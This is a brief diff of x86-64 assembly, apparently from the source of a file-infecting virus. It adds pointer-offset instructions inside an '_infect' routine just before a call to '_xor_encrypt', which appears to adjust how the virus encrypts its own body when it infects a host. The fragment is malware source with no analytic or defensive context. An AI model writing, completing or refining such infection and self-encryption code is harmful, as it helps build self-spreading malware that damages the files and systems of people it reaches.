@@ -1163,6 +1163,10 @@ _infect:
 	push rdx
 	sub rsi, rcx ; length - (_virus - _params)
 	lea rdx, [rel _h3ll0w0rld]
+	sub rdx, rcx
+	add rdx, rdi
+	lea rcx, [rel _params]
+	sub rdx, rcx
 	mov rcx, KEY_SIZE
 	call _xor_encrypt
 
